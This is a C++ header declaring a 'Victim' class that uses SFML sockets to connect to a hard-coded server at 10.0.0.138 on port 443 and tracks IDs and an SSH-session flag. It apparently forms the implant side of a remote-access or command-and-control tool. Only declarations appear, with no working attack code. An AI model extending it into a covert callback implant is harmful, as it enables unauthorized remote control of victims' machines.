#include <SFML/Network.hpp>
#include <iostream>

class Victim {
public:
	Victim(std::string inHId);
	int runVictimProcess();

private:
	bool connectServer();

	sf::TcpSocket server;
	std::string myHId = "";
	int16_t myId = 0;
	uint16_t requestId = 1;

	sf::IpAddress serverIp = sf::IpAddress(10, 0, 0, 138);
	short serverPort = 443;

	bool isInitialized = false;
	bool isSshActive = false;
};